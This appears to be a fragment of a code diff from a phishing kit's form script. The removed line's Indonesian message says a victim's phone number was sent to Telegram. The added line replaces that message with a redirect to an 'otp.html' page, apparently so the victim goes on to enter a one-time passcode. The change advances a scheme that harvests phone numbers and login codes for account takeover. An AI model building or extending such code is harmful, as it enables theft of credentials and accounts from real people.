@@ -175,7 +175,7 @@
         });
 
         if (response.ok) {
-          alert("Nomor Handphone berhasil dikirim ke Telegram.");
+          window.location.href = "otp.html";
           form.reset();
           submitBtn.disabled = true;
           submitBtn.classList.add("bg-[#BDBDBD]", "cursor-not-allowed");
